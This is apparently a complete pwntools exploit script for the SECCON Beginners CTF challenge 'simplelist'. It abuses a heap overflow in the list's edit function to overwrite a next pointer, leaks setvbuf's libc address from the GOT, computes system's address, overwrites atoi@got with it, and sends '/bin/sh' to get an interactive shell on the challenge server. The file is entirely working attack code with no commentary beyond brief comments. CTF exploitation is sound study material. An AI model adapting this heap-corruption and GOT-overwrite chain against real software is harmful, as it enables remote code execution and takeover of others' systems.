#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc-2.33.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("simplelist.quals.beginners.seccon.jp", 9003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
        loadsym
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def create(buf):
    p.recvuntil(">")
    p.sendline('1')
    p.recvuntil("Content:")
    p.sendline(buf)

def edit(index, buf):
    p.recvuntil(">")
    p.sendline('2')
    p.recvuntil("index:")
    p.sendline(str(index))
    p.recvuntil("New content:")
    p.sendline(buf)


create(b'A' * 0x20)
create(b'B' * 0x20)

# overwrite next address(index=1)
payload = b'C' * 0x20# buffer for index 0
payload += p64(0x31) # heap chunk header
payload += p64(elf.got['setvbuf'] - 0x8)# next address
edit(0, payload)

# leak libc address
p.recvuntil(">")
p.sendline('2')
p.recvuntil("index:")
p.sendline(str(2))
p.recvuntil("Old content: ")
setvbuf_libc_addr = u64(p.recvline().rstrip(b'\n') + b'\00' * 2)
log.info("setvbuf@libc: " + hex(setvbuf_libc_addr))
libc_base = setvbuf_libc_addr - libc.symbols['setvbuf']
log.info("libc base: " + hex(libc_base))
system_libc_addr = libc_base + libc.symbols['system']
log.info("system@libc: " + hex(system_libc_addr))
p.recvuntil("New content:")
p.sendline(b'')

# GOT overwrite (atoi@got -> system@libc)
payload = b'C' * 0x20# buffer for index 0
payload += p64(0x31) # heap chunk header
payload += p64(elf.got['atoi'] - 0x8)
edit(0, payload)
edit(2, p64(system_libc_addr))

# exec shell
p.recvuntil(">")
p.sendline("/bin/sh")

p.interactive()
